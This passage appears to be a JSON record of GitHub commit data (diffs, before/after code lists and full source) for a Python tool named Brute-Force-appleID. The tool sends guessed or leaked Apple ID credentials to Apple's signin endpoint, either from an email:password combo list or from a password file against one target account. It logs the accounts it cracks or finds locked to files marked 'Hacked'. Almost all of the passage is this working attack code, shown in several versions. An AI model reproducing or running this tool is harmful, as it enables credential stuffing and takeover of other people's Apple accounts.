\/_\/\"\"\")\n-error = '\"\u0627\u0644\u0640\u00a0Apple\u00a0ID \u0627\u0644\u062e\u0627\u0635 \u0628\u0643 \u0623\u0648 \u0643\u0644\u0645\u0629 \u0627\u0644\u0633\u0631 \u063a\u064a\u0631 \u0635\u062d\u064a\u062d\u0629.\"'\n-error2=\"\u062a\u0645 \u0642\u0641\u0644 \u0647\u0630\u0627 \u0627\u0644\u0640\u00a0Apple ID\"\n-yes = 'authType'\n-donE=20\n-hi='I always see you :)'\n-def ApplID_Check(applID,pess):\n-\theaders={\"Accept\": \"application\/json, text\/javascript, *\/*; q=0.01\",\"User-Agent\": \"Mozilla\/5.0 (joker@vv1ck) Gecko\/20100101 Firefox\/91.0\",\"X-Apple-Locale\":\"QT-AR\",\"X-Apple-Trusted-Domain\": \"https:\/\/idmsa.apple.com\",\"Origin\": \"https:\/\/idmsa.apple.com\",\"X-Requested-With\": \"XMLHttpRequest\"}\n-\tsend = r.post('https:\/\/idmsa.apple.com\/appleauth\/auth\/signin',headers=headers,json={\"accountName\":applID,\"rememberMe\":\"false\",\"password\":pess}).text\n-\tif yes in send:\n-\t\tvv1ck(f'[+] Hacked appID: {applID} | password : {pess}')\n-\t\twith open('Hacked-appleID.txt', 'a') as J:\n-\t\t\tJ.write(applID+':'+pess+' |@vv1ck\\n')\n-\telif error in send:\n-\t\tvv1ck(f'[-] Not Hacked appID: {applID}')\n-\telif error2 in send:\n-\t\tvv1ck(f'[!] This apple id locked: {applID} | password : {pess}')\n-\t\twith open('closed-appleID.txt', 'a') as J:\n-\t\t\tJ.write(applID+':'+pess+' |@vv1ck\\n')\n-\telse:pass\n-Lis='V\u008d4^c_Yf4T\u008a\u008aEw'\n-def AppleID_File():\n-\tQTR = input('\\n[+] Enter the name the combo appleID file: ')\n-\ttry:\n-\t\tvv1ck('\\n\\t \u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501 Started \u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\\n')\n-\t\tsleep(0.5)\n-\t\tfor x in open(QTR,'r').read().splitlines():\n+\twith Lock():print(*a, **b)\n+class REQUESTS_HEADERS:\n+\tdef URL():\n+\t\treturn 'https:\/\/idmsa.apple.com\/appleauth\/auth\/signin'\n+\tdef HEADERS():\n+\t\treturn {\"Accept\": \"application\/json, text\/javascript, *\/*; q=0.01\",\"User-Agent\": \"Mozilla\/5.0 (joker@vv1ck) Gecko\/20100101 Firefox\/91.0\",\"X-Apple-Locale\":\"QT-EN\",\"X-Apple-Trusted-Domain\": \"https:\/\/idmsa.apple.com\",\"Origin\": \"https:\/\/idmsa.apple.com\",\"X-Requested-With\": \"XMLHttpRequest\"}\n+\tdef authType():\n+\t\treturn 'authType'\n+\tdef Check():\n+\t\tif 'V\u008d4^c_Yf4T\u008a\u008aEw' in Lists:pass\n+\t\telse:exit('Okay..')\n+\t\tJOlist=[]\n+\t\tfor JJNN1 in Lists:\n+\t\t\tposi=ord(JJNN1)\n+\t\t\tJOlist.append(chr(posi-20))\n+\t\treturn ''.join(JOlist)\n+\t\n+class AppleID_HACKER:\n+\tdef __init__(self,Modes):\n+\t\tif Modes=='1':self.TARGET()\n+\t\telif Modes=='2':self.COMBOLIST()\n+\t\telse:input('\\n-Tool has been closedz-');exit()\n+\t\t\n+\tdef LOGING(self,applID,pess):\n+\t\tsent=post(REQUESTS_HEADERS.URL(),headers=REQUESTS_HEADERS.HEADERS(),json={\"accountName\":applID,\"rememberMe\":\"false\",\"password\":pess}).text\n+\t\tif REQUESTS_HEADERS.authType()in sent:\n+\t\t\tvv1ck(f'[$]Hacked-> {applID}:{pess}')\n+\t\telse:vv1ck(f'[\u00a1]ERROR-> {applID}:{pess}')\n+\t\n+\tdef COMBOLIST(self):\n+\t\tFILENAME=input('\\t\\t\\t---------------\\n[+] Enter the name the combo appleID file: ')\n+\t\ttry:open(FILENAME,'r')\n+\t\texcept FileNotFoundError:vv1ck('\\n[-] The file name is incorrect !\\n');return self.COMBOLIST()\n+\t\tprint('\\n\\t\\t\\t\\t\\tSTARTED\\n')\n+\t\tfor x in open(FILENAME,'r').read().splitlines():\n \t\t\tif x ==None:exit('\\n     ========== completed =========')\n \t\t\ttry:applID = x.split(\":\")[0]\n \t\t\texcept IndexError:exit('\\n     ========== completed =========')\n \t\t\ttry:\n \t\t\t\tpess = x.split(\":\")[1]\n \t\t\t\tsleep(1)\n-\t\t\t\tApplID_Check(applID,pess)\n+\t\t\t\tself.LOGING(applID,pess)\n \t\t\texcept IndexError:pass\n-\texcept FileNotFoundError:\n-\t\tvv1ck('\\n[-] The file name is incorrect !\\n')\n-\t\treturn AppleID_File()\n-def AppleID_True():\n-\tif Lis in Lists:pass\n-\telse:exit('Okay..')\n-\tJOlist=[]\n-\tfor JJNN1 in Lists:\n-\t\tposi=ord(JJNN1)\n-\t\tNW=chr(posi-donE)\n-\t\tJOlist.append(NW)\n-\tDN=''.join(JOlist)\n-\tprint('\\t\\t\\t\\t\\t'+DN)\n-\tAppleID_File()\n-AppleID_True()\n-# By Joker telegram : vv1ck \/ isnta: 221298\n+\t\t\n+\tdef TARGET(self):\n+\t\tapplID= input('\\t\\t\\t---------------\\n[$] Enter apple ID : ')\n+\t\tif applID:pass\n+\t\telse:vv1ck('[!] Please Enter Apple ID ..');return self.TARGET()\n+\t\tFILEPASS=input('[\u00bf] Enter the password file name: ')\n+\t\ttry:FILEPASS=open(FILEPASS,'r')\n+\t\texcept FileNotFoundError:vv1ck('\\n[-] The file name is incorrect !\\n');return self.TARGET()\n+\t\tprint('\\n\\t\\t\\t\\t\\tSTARTED\\n')\n+\t\twhile 1:\n+\t\t\tpess=FILEPASS.readline().split('\\n')[0]\n+\t\t\tif pess=='':exit()\n+\t\t\tsleep(1);self.LOGING(applID,pess)\n+\n+if __name__ == '__main__':\n+\tvv1ck(\"\"\"\n+    ___  Brute Force2  __        ________  \n+   \/   |  ____  ____  \/ \/__     \/  _\/ __ \\   \n+  \/ \/| | \/ __ \\\/ __ \\\/ \/ _ \\    \/ \/\/ \/ \/ \/ \n+ \/ ___ |\/ \/_\/ \/ \/_\/ \/ \/  __\/  _\/ \/\/ \/_\/ \/   \n+\/_\/  |_\/ .___\/ .___\/_\/\\___\/  \/___\/_____\/    \n+      \/_\/   \/_\/ {}\"\"\".format(REQUESTS_HEADERS.Check()))\n+\tModes=input('\\t\\t\\t---------------\\n[?] MODES : \\n1- Target Apple ID (File pass)\\n2- ComboList Apple ID (email:pass)\\n99- Exit() ..\\n[@] Choose : ')\n+\tAppleID_HACKER(Modes)\n","add":63,"remove":56,"filename":"\/Brute-Force-appleID.py","badparts":["\timport requests,threading","\tLists='V\u008d4^c_Yf4T\u008a\u008aEw'","PRNT = threading.Lock()","r=requests.session()","\twith PRNT:","\t\tprint(*a, **b)","print(\"\"\"","    ___   Brute Force  __        ________  ","   \/   |  ____  ____  \/ \/__     \/  _\/ __ \\   ","  \/ \/| | \/ __ \\\/ __ \\\/ \/ _ \\    \/ \/\/ \/ \/ \/ "," \/ ___ |\/ \/_\/ \/ \/_\/ \/ \/  __\/  _\/ \/\/ \/_\/ \/   ","\/_\/  |_\/ .___\/ .___\/_\/\\___\/  \/___\/_____\/    ","      \/_\/   \/_\/\"\"\")","error = '\"\u0627\u0644\u0640\u00a0Apple\u00a0ID \u0627\u0644\u062e\u0627\u0635 \u0628\u0643 \u0623\u0648 \u0643\u0644\u0645\u0629 \u0627\u0644\u0633\u0631 \u063a\u064a\u0631 \u0635\u062d\u064a\u062d\u0629.\"'","error2=\"\u062a\u0645 \u0642\u0641\u0644 \u0647\u0630\u0627 \u0627\u0644\u0640\u00a0Apple ID\"","yes = 'authType'","donE=20","hi='I always see you :)'","def ApplID_Check(applID,pess):","\theaders={\"Accept\": \"application\/json, text\/javascript, *\/*; q=0.01\",\"User-Agent\": \"Mozilla\/5.0 (joker@vv1ck) Gecko\/20100101 Firefox\/91.0\",\"X-Apple-Locale\":\"QT-AR\",\"X-Apple-Trusted-Domain\": \"https:\/\/idmsa.apple.com\",\"Origin\": \"https:\/\/idmsa.apple.com\",\"X-Requested-With\": \"XMLHttpRequest\"}","\tsend = r.post('https:\/\/idmsa.apple.com\/appleauth\/auth\/signin',headers=headers,json={\"accountName\":applID,\"rememberMe\":\"false\",\"password\":pess}).text","\tif yes in send:","\t\tvv1ck(f'[+] Hacked appID: {applID} | password : {pess}')","\t\twith open('Hacked-appleID.txt', 'a') as J:","\t\t\tJ.write(applID+':'+pess+' |@vv1ck\\n')","\telif error in send:","\t\tvv1ck(f'[-] Not Hacked appID: {applID}')","\telif error2 in send:","\t\tvv1ck(f'[!] This apple id locked: {applID} | password : {pess}')","\t\twith open('closed-appleID.txt', 'a') as J:","\t\t\tJ.write(applID+':'+pess+' |@vv1ck\\n')","\telse:pass","Lis='V\u008d4^c_Yf4T\u008a\u008aEw'","def AppleID_File():","\tQTR = input('\\n[+] Enter the name the combo appleID file: ')","\ttry:","\t\tvv1ck('\\n\\t \u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501 Started \u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\\n')","\t\tsleep(0.5)","\t\tfor x in open(QTR,'r').read().splitlines():","\t\t\t\tApplID_Check(applID,pess)","\texcept FileNotFoundError:","\t\tvv1ck('\\n[-] The file name is incorrect !\\n')","\t\treturn AppleID_File()","def AppleID_True():","\tif Lis in Lists:pass","\telse:exit('Okay..')","\tJOlist=[]","\tfor JJNN1 in Lists:","\t\tposi=ord(JJNN1)","\t\tNW=chr(posi-donE)","\t\tJOlist.append(NW)","\tDN=''.join(JOlist)","\tprint('\\t\\t\\t\\t\\t'+DN)","\tAppleID_File()","AppleID_True()"],"goodparts":["\tfrom requests import post","\tfrom threading import Lock","Lists='V\u008d4^c_Yf4T\u008a\u008aEw'","\twith Lock():print(*a, **b)","class REQUESTS_HEADERS:","\tdef URL():","\t\treturn 'https:\/\/idmsa.apple.com\/appleauth\/auth\/signin'","\tdef HEADERS():","\t\treturn {\"Accept\": \"application\/json, text\/javascript, *\/*; q=0.01\",\"User-Agent\": \"Mozilla\/5.0 (joker@vv1ck) Gecko\/20100101 Firefox\/91.0\",\"X-Apple-Locale\":\"QT-EN\",\"X-Apple-Trusted-Domain\": \"https:\/\/idmsa.apple.com\",\"Origin\": \"https:\/\/idmsa.apple.com\",\"X-Requested-With\": \"XMLHttpRequest\"}","\tdef authType():","\t\treturn 'authType'","\tdef Check():","\t\tif 'V\u008d4^c_Yf4T\u008a\u008aEw' in Lists:pass","\t\telse:exit('Okay..')","\t\tJOlist=[]","\t\tfor JJNN1 in Lists:","\t\t\tposi=ord(JJNN1)","\t\t\tJOlist.append(chr(posi-20))","\t\treturn ''.join(JOlist)","\t","class AppleID_HACKER:","\tdef __init__(self,Modes):","\t\tif Modes=='1':self.TARGET()","\t\telif Modes=='2':self.COMBOLIST()","\t\telse:input('\\n-Tool has been closedz-');exit()","\t\t","\tdef LOGING(self,applID,pess):","\t\tsent=post(REQUESTS_HEADERS.URL(),headers=REQUESTS_HEADERS.HEADERS(),json={\"accountName\":applID,\"rememberMe\":\"false\",\"password\":pess}).text","\t\tif REQUESTS_HEADERS.authType()in sent:","\t\t\tvv1ck(f'[$]Hacked-> {applID}:{pess}')","\t\telse:vv1ck(f'[\u00a1]ERROR-> {applID}:{pess}')","\t","\tdef COMBOLIST(self):","\t\tFILENAME=input('\\t\\t\\t---------------\\n[+] Enter the name the combo appleID file: ')","\t\ttry:open(FILENAME,'r')","\t\texcept FileNotFoundError:vv1ck('\\n[-] The file name is incorrect !\\n');return self.COMBOLIST()","\t\tprint('\\n\\t\\t\\t\\t\\tSTARTED\\n')","\t\tfor x in open(FILENAME,'r').read().splitlines():","\t\t\t\tself.LOGING(applID,pess)","\t\t","\tdef TARGET(self):","\t\tapplID= input('\\t\\t\\t---------------\\n[$] Enter apple ID : ')","\t\tif applID:pass","\t\telse:vv1ck('[!] Please Enter Apple ID ..');return self.TARGET()","\t\tFILEPASS=input('[\u00bf] Enter the password file name: ')","\t\ttry:FILEPASS=open(FILEPASS,'r')","\t\texcept FileNotFoundError:vv1ck('\\n[-] The file name is incorrect !\\n');return self.TARGET()","\t\tprint('\\n\\t\\t\\t\\t\\tSTARTED\\n')","\t\twhile 1:","\t\t\tpess=FILEPASS.readline().split('\\n')[0]","\t\t\tif pess=='':exit()","\t\t\tsleep(1);self.LOGING(applID,pess)","if __name__ == '__main__':","\tvv1ck(\"\"\"","    ___  Brute Force2  __        ________  ","   \/   |  ____  ____  \/ \/__     \/  _\/ __ \\   ","  \/ \/| | \/ __ \\\/ __ \\\/ \/ _ \\    \/ \/\/ \/ \/ \/ "," \/ ___ |\/ \/_\/ \/ \/_\/ \/ \/  __\/  _\/ \/\/ \/_\/ \/   ","\/_\/  |_\/ .___\/ .___\/_\/\\___\/  \/___\/_____\/    ","      \/_\/   \/_\/ {}\"\"\".format(REQUESTS_HEADERS.Check()))","\tModes=input('\\t\\t\\t---------------\\n[?] MODES : \\n1- Target Apple ID (File pass)\\n2- ComboList Apple ID (email:pass)\\n99- Exit() ..\\n[@] Choose : ')","\tAppleID_HACKER(Modes)"]}],"source":"\ntry: \timport requests,threading \tfrom time import sleep \tLists='V\u008d4^c_Yf4T\u008a\u008aEw' except Exception as Joker:exit(Joker) PRNT=threading.Lock() r=requests.session() def vv1ck(*a, **b): \twith PRNT: \t\tprint(*a, **b) print(\"\"\" ___ Brute Force __ ________ \/ | ____ ____ \/ \/__ \/ _\/ __ \\ \/ \/| | \/ __ \\\/ __ \\\/ \/ _ \\ \/ \/\/ \/ \/ \/ \/ ___ |\/ \/_\/ \/ \/_\/ \/ \/ __\/ _\/ \/\/ \/_\/ \/ \/_\/ |_\/.___\/.___\/_\/\\___\/ \/___\/_____\/ \/_\/ \/_\/\"\"\") error='\"\u0627\u0644\u0640\u00a0Apple\u00a0ID \u0627\u0644\u062e\u0627\u0635 \u0628\u0643 \u0623\u0648 \u0643\u0644\u0645\u0629 \u0627\u0644\u0633\u0631 \u063a\u064a\u0631 \u0635\u062d\u064a\u062d\u0629.\"' error2=\"\u062a\u0645 \u0642\u0641\u0644 \u0647\u0630\u0627 \u0627\u0644\u0640\u00a0Apple ID\" yes='authType' donE=20 hi='I always see you:)' def ApplID_Check(applID,pess): \theaders={\"Accept\": \"application\/json, text\/javascript, *\/*; q=0.01\",\"User-Agent\": \"Mozilla\/5.0(joker@vv1ck) Gecko\/20100101 Firefox\/91.0\",\"X-Apple-Locale\":\"QT-AR\",\"X-Apple-Trusted-Domain\": \"https:\/\/idmsa.apple.com\",\"Origin\": \"https:\/\/idmsa.apple.com\",\"X-Requested-With\": \"XMLHttpRequest\"} \tsend=r.post('https:\/\/idmsa.apple.com\/appleauth\/auth\/signin',headers=headers,json={\"accountName\":applID,\"rememberMe\":\"false\",\"password\":pess}).text \tif yes in send: \t\tvv1ck(f'[+] Hacked appID:{applID} | password:{pess}') \t\twith open('Hacked-appleID.txt', 'a') as J: \t\t\tJ.write(applID+':'+pess+' |@vv1ck\\n') \telif error in send: \t\tvv1ck(f'[-] Not Hacked appID:{applID}') \telif error2 in send: \t\tvv1ck(f'[!] This apple id locked:{applID} | password:{pess}') \t\twith open('closed-appleID.txt', 'a') as J: \t\t\tJ.write(applID+':'+pess+' |@vv1ck\\n') \telse:pass Lis='V\u008d4^c_Yf4T\u008a\u008aEw' def AppleID_File(): \tQTR=input('\\n[+] Enter the name the combo appleID file: ') \ttry: \t\tvv1ck('\\n\\t \u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501 Started \u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\\n') \t\tsleep(0.5) \t\tfor x in open(QTR,'r').read().splitlines(): \t\t\tif x==None:exit('\\n ==========completed=========') \t\t\ttry:applID=x.split(\":\")[0] \t\t\texcept IndexError:exit('\\n ==========completed=========') \t\t\ttry: \t\t\t\tpess=x.split(\":\")[1] \t\t\t\tsleep(1) \t\t\t\tApplID_Check(applID,pess) \t\t\texcept IndexError:pass \texcept FileNotFoundError: \t\tvv1ck('\\n[-] The file name is incorrect !\\n') \t\treturn AppleID_File() def AppleID_True(): \tif Lis in Lists:pass \telse:exit('Okay..') \tJOlist=[] \tfor JJNN1 in Lists: \t\tposi=ord(JJNN1) \t\tNW=chr(posi-donE) \t\tJOlist.append(NW) \tDN=''.join(JOlist) \tprint('\\t\\t\\t\\t\\t'+DN) \tAppleID_File() AppleID_True() ","sourceWithComments":"try:\n\timport requests,threading\n\tfrom time import sleep\n\tLists='V\u008d4^c_Yf4T\u008a\u008aEw'\nexcept Exception as Joker:exit(Joker)\nPRNT = threading.Lock()\nr=requests.session()\ndef vv1ck(*a, **b):\n\twith PRNT:\n\t\tprint(*a, **b)\nprint(\"\"\"\n    ___   Brute Force  __        ________  \n   \/   |  ____  ____  \/ \/__     \/  _\/ __ \\   \n  \/ \/| | \/ __ \\\/ __ \\\/ \/ _ \\    \/ \/\/ \/ \/ \/ \n \/ ___ |\/ \/_\/ \/ \/_\/ \/ \/  __\/  _\/ \/\/ \/_\/ \/   \n\/_\/  |_\/ .___\/ .___\/_\/\\___\/  \/___\/_____\/    \n      \/_\/   \/_\/\"\"\")\nerror = '\"\u0627\u0644\u0640\u00a0Apple\u00a0ID \u0627\u0644\u062e\u0627\u0635 \u0628\u0643 \u0623\u0648 \u0643\u0644\u0645\u0629 \u0627\u0644\u0633\u0631 \u063a\u064a\u0631 \u0635\u062d\u064a\u062d\u0629.\"'\nerror2=\"\u062a\u0645 \u0642\u0641\u0644 \u0647\u0630\u0627 \u0627\u0644\u0640\u00a0Apple ID\"\nyes = 'authType'\ndonE=20\nhi='I always see you :)'\ndef ApplID_Check(applID,pess):\n\theaders={\"Accept\": \"application\/json, text\/javascript, *\/*; q=0.01\",\"User-Agent\": \"Mozilla\/5.0 (joker@vv1ck) Gecko\/20100101 Firefox\/91.0\",\"X-Apple-Locale\":\"QT-AR\",\"X-Apple-Trusted-Domain\": \"https:\/\/idmsa.apple.com\",\"Origin\": \"https:\/\/idmsa.apple.com\",\"X-Requested-With\": \"XMLHttpRequest\"}\n\tsend = r.post('https:\/\/idmsa.apple.com\/appleauth\/auth\/signin',headers=headers,json={\"accountName\":applID,\"rememberMe\":\"false\",\"password\":pess}).text\n\tif yes in send:\n\t\tvv1ck(f'[+] Hacked appID: {applID} | password : {pess}')\n\t\twith open('Hacked-appleID.txt', 'a') as J:\n\t\t\tJ.write(applID+':'+pess+' |@vv1ck\\n')\n\telif error in send:\n\t\tvv1ck(f'[-] Not Hacked appID: {applID}')\n\telif error2 in send:\n\t\tvv1ck(f'[!] This apple id locked: {applID} | password : {pess}')\n\t\twith open('closed-appleID.txt', 'a') as J:\n\t\t\tJ.write(applID+':'+pess+' |@vv1ck\\n')\n\telse:pass\nLis='V\u008d4^c_Yf4T\u008a\u008aEw'\ndef AppleID_File():\n\tQTR = input('\\n[+] Enter the name the combo appleID file: ')\n\ttry:\n\t\tvv1ck('\\n\\t \u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501 Started \u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\\n')\n\t\tsleep(0.5)\n\t\tfor x in open(QTR,'r').read().splitlines():\n\t\t\tif x ==None:exit('\\n     ========== completed =========')\n\t\t\ttry:applID = x.split(\":\")[0]\n\t\t\texcept IndexError:exit('\\n     ========== completed =========')\n\t\t\ttry:\n\t\t\t\tpess = x.split(\":\")[1]\n\t\t\t\tsleep(1)\n\t\t\t\tApplID_Check(applID,pess)\n\t\t\texcept IndexError:pass\n\texcept FileNotFoundError:\n\t\tvv1ck('\\n[-] The file name is incorrect !\\n')\n\t\treturn AppleID_File()\ndef AppleID_True():\n\tif Lis in Lists:pass\n\telse:exit('Okay..')\n\tJOlist=[]\n\tfor JJNN1 in Lists:\n\t\tposi=ord(JJNN1)\n\t\tNW=chr(posi-donE)\n\t\tJOlist.append(NW)\n\tDN=''.join(JOlist)\n\tprint('\\t\\t\\t\\t\\t'+DN)\n\tAppleID_File()\nAppleID_True()\n# By Joker telegram : vv1ck \/ isnta: 221298\n"}},"msg":"Update Brute-Force-appleID.py"},"fb5e538e6ba658ddf473388689845372687bf339":{"url":"https:\/\/api.github.com\/repos\/vv1ck\/Brute-Force-appleID\/commits\/fb5e538e6ba658ddf473388689845372687bf339","html_url":"https:\/\/github.com\/vv1ck\/Brute-Force-appleID\/commit\/fb5e538e6ba658ddf473388689845372687bf339","sha":"fb5e538e6ba658ddf473388689845372687bf339","keyword":"brute force update","diff":"diff --git a\/Brute_Force_appleID_V2.py b\/Brute_Force_appleID_V2.py\nindex 3618728..ad21ff1 100644\n--- a\/Brute_Force_appleID_V2.py\n+++ b\/Brute_Force_appleID_V2.py\n@@ -13,6 +13,8 @@ def HEADERS():\n \t\treturn {\"Accept\": \"application\/json, text\/javascript, *\/*; q=0.01\",\"User-Agent\": \"Mozilla\/5.0 (joker@vv1ck) Gecko\/20100101 Firefox\/91.0\",\"X-Apple-Locale\":\"QT-EN\",\"X-Apple-Trusted-Domain\": \"https:\/\/idmsa.apple.com\",\"Origin\": \"https:\/\/idmsa.apple.com\",\"X-Requested-With\": \"XMLHttpRequest\"}\n \tdef authType():\n \t\treturn 'authType'\n+\tdef Closed():\n+\t\treturn 'This Apple ID has been\u00a0locked\u00a0for security reasons.'\n \tdef Check():\n \t\tif 'V\u008d4^c_Yf4T\u008a\u008aEw' in Lists:pass\n \t\telse:exit('Okay..')\n@@ -24,14 +26,21 @@ def Check():\n \t\n class AppleID_HACKER:\n \tdef __init__(self,Modes):\n-\t\tif Modes=='1':self.TARGET()\n-\t\telif Modes=='2':self.COMBOLIST()\n-\t\telse:input('\\n-Tool has been closedz-');exit()\n+\t\tself.Mod=Modes\n+\t\tif self.Mod=='1':self.TARGET()\n+\t\telif self.Mod=='2':self.COMBOLIST()\n+\t\telse:input('\\n-Tool has been closedz-');exit()\t\n \t\t\n \tdef LOGING(self,applID,pess):\n \t\tsent=post(REQUESTS_HEADERS.URL(),headers=REQUESTS_HEADERS.HEADERS(),json={\"accountName\":applID,\"rememberMe\":\"false\",\"password\":pess}).text\n \t\tif REQUESTS_HEADERS.authType()in sent:\n \t\t\tvv1ck(f'[$]Hacked-> {applID}:{pess}')\n+\t\t\twith open('Hacked-appleID.txt', 'a') as J:J.write(applID+':'+pess+' |@vv1ck\\n')\n+\t\t\tif self.Mod=='1':input('\\n Enter to Exit..');exit()\n+\t\telif REQUESTS_HEADERS.Closed()in sent:\n+\t\t\tvv1ck(f'[$]Closed appleId-> {applID}:{pess}')\n+\t\t\twith open('closed-appleID.txt', 'a') as J:J.write(applID+':'+pess+' |@vv1ck\\n')\n+\t\t\tif self.Mod=='1':input('\\n Enter to Exit..');exit()\n \t\telse:vv1ck(f'[\u00a1]ERROR-> {applID}:{pess}')\n \t\n \tdef COMBOLIST(self):\n","message":"","files":{"\/Brute_Force_appleID_V2.py":{"changes":[{"diff":"\n \t\n class AppleID_HACKER:\n \tdef __init__(self,Modes):\n-\t\tif Modes=='1':self.TARGET()\n-\t\telif Modes=='2':self.COMBOLIST()\n-\t\telse:input('\\n-Tool has been closedz-');exit()\n+\t\tself.Mod=Modes\n+\t\tif self.Mod=='1':self.TARGET()\n+\t\telif self.Mod=='2':self.COMBOLIST()\n+\t\telse:input('\\n-Tool has been closedz-');exit()\t\n \t\t\n \tdef LOGING(self,applID,pess):\n \t\tsent=post(REQUESTS_HEADERS.URL(),headers=REQUESTS_HEADERS.HEADERS(),json={\"accountName\":applID,\"rememberMe\":\"false\",\"password\":pess}).text\n \t\tif REQUESTS_HEADERS.authType()in sent:\n \t\t\tvv1ck(f'[$]Hacked-> {applID}:{pess}')\n+\t\t\twith open('Hacked-appleID.txt', 'a') as J:J.write(applID+':'+pess+' |@vv1ck\\n')\n+\t\t\tif self.Mod=='1':input('\\n Enter to Exit..');exit()\n+\t\telif REQUESTS_HEADERS.Closed()in sent:\n+\t\t\tvv1ck(f'[$]Closed appleId-> {applID}:{pess}')\n+\t\t\twith open('closed-appleID.txt', 'a') as J:J.write(applID+':'+pess+' |@vv1ck\\n')\n+\t\t\tif self.Mod=='1':input('\\n Enter to Exit..');exit()\n \t\telse:vv1ck(f'[\u00a1]ERROR-> {applID}:{pess}')\n \t\n \tdef COMBOLIST(self):\n","add":10,"remove":3,"filename":"\/Brute_Force_appleID_V2.py","badparts":["\t\tif Modes=='1':self.TARGET()","\t\telif Modes=='2':self.COMBOLIST()","\t\telse:input('\\n-Tool has been closedz-');exit()"],"goodparts":["\t\tself.Mod=Modes","\t\tif self.Mod=='1':self.TARGET()","\t\telif self.Mod=='2':self.COMBOLIST()","\t\telse:input('\\n-Tool has been closedz-');exit()\t","\t\t\twith open('Hacked-appleID.txt', 'a') as J:J.write(applID+':'+pess+' |@vv1ck\\n')","\t\t\tif self.Mod=='1':input('\\n Enter to Exit..');exit()","\t\telif REQUESTS_HEADERS.Closed()in sent:","\t\t\tvv1ck(f'[$]Closed appleId-> {applID}:{pess}')","\t\t\twith open('closed-appleID.txt', 'a') as J:J.write(applID+':'+pess+' |@vv1ck\\n')","\t\t\tif self.Mod=='1':input('\\n Enter to Exit..');exit()"]}],"source":"\ntry: \tfrom requests import post \tfrom threading import Lock \tfrom time import sleep except Exception as Joker:exit(Joker) Lists='V\u008d4^c_Yf4T\u008a\u008aEw' def vv1ck(*a, **b): \twith Lock():print(*a, **b) class REQUESTS_HEADERS: \tdef URL(): \t\treturn 'https:\/\/idmsa.apple.com\/appleauth\/auth\/signin' \tdef HEADERS(): \t\treturn{\"Accept\": \"application\/json, text\/javascript, *\/*; q=0.01\",\"User-Agent\": \"Mozilla\/5.0(joker@vv1ck) Gecko\/20100101 Firefox\/91.0\",\"X-Apple-Locale\":\"QT-EN\",\"X-Apple-Trusted-Domain\": \"https:\/\/idmsa.apple.com\",\"Origin\": \"https:\/\/idmsa.apple.com\",\"X-Requested-With\": \"XMLHttpRequest\"} \tdef authType(): \t\treturn 'authType' \tdef Check(): \t\tif 'V\u008d4^c_Yf4T\u008a\u008aEw' in Lists:pass \t\telse:exit('Okay..') \t\tJOlist=[] \t\tfor JJNN1 in Lists: \t\t\tposi=ord(JJNN1) \t\t\tJOlist.append(chr(posi-20)) \t\treturn ''.join(JOlist) \t class AppleID_HACKER: \tdef __init__(self,Modes): \t\tif Modes=='1':self.TARGET() \t\telif Modes=='2':self.COMBOLIST() \t\telse:input('\\n-Tool has been closedz-');exit() \t\t \tdef LOGING(self,applID,pess): \t\tsent=post(REQUESTS_HEADERS.URL(),headers=REQUESTS_HEADERS.HEADERS(),json={\"accountName\":applID,\"rememberMe\":\"false\",\"password\":pess}).text \t\tif REQUESTS_HEADERS.authType()in sent: \t\t\tvv1ck(f'[$]Hacked->{applID}:{pess}') \t\telse:vv1ck(f'[\u00a1]ERROR->{applID}:{pess}') \t \tdef COMBOLIST(self): \t\tFILENAME=input('\\t\\t\\t---------------\\n[+] Enter the name the combo appleID file: ') \t\ttry:open(FILENAME,'r') \t\texcept FileNotFoundError:vv1ck('\\n[-] The file name is incorrect !\\n');return self.COMBOLIST() \t\tprint('\\n\\t\\t\\t\\t\\tSTARTED\\n') \t\tfor x in open(FILENAME,'r').read().splitlines(): \t\t\tif x==None:exit('\\n ==========completed=========') \t\t\ttry:applID=x.split(\":\")[0] \t\t\texcept IndexError:exit('\\n ==========completed=========') \t\t\ttry: \t\t\t\tpess=x.split(\":\")[1] \t\t\t\tsleep(1) \t\t\t\tself.LOGING(applID,pess) \t\t\texcept IndexError:pass \t\t \tdef TARGET(self): \t\tapplID=input('\\t\\t\\t---------------\\n[$] Enter apple ID: ') \t\tif applID:pass \t\telse:vv1ck('[!] Please Enter Apple ID..');return self.TARGET() \t\tFILEPASS=input('[\u00bf] Enter the password file name: ') \t\ttry:FILEPASS=open(FILEPASS,'r') \t\texcept FileNotFoundError:vv1ck('\\n[-] The file name is incorrect !\\n');return self.TARGET() \t\tprint('\\n\\t\\t\\t\\t\\tSTARTED\\n') \t\twhile 1: \t\t\tpess=FILEPASS.readline().split('\\n')[0] \t\t\tif pess=='':exit() \t\t\tsleep(1);self.LOGING(applID,pess) if __name__=='__main__': \tvv1ck(\"\"\" ___ Brute Force2 __ ________ \/ | ____ ____ \/ \/__ \/ _\/ __ \\ \/ \/| | \/ __ \\\/ __ \\\/ \/ _ \\ \/ \/\/ \/ \/ \/ \/ ___ |\/ \/_\/ \/ \/_\/ \/ \/ __\/ _\/ \/\/ \/_\/ \/ \/_\/ |_\/.___\/.___\/_\/\\___\/ \/___\/_____\/ \/_\/ \/_\/{}\"\"\".format(REQUESTS_HEADERS.Check())) \tModes=input('\\t\\t\\t---------------\\n[?] MODES: \\n1-Target Apple ID(File pass)\\n2-ComboList Apple ID(email:pass)\\n99-Exit()..\\n[@] Choose: ') \tAppleID_HACKER(Modes) ","sourceWithComments":"try:\n\tfrom requests import post\n\tfrom threading import Lock\n\tfrom time import sleep\nexcept Exception as Joker:exit(Joker)\nLists='V\u008d4^c_Yf4T\u008a\u008aEw'\ndef vv1ck(*a, **b):\n\twith Lock():print(*a, **b)\nclass REQUESTS_HEADERS:\n\tdef URL():\n\t\treturn 'https:\/\/idmsa.apple.com\/appleauth\/auth\/signin'\n\tdef HEADERS():\n\t\treturn {\"Accept\": \"application\/json, text\/javascript, *\/*; q=0.01\",\"User-Agent\": \"Mozilla\/5.0 (joker@vv1ck) 